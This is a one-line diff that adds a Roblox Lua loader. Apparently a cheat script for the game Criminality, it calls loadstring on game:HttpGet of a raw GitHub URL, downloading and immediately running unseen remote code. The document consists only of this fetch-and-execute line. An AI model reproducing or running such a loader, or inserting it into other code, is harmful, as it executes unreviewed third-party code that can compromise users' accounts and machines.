@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/criminality-spam7-wp5g71vfhsf7kd.lua"))()
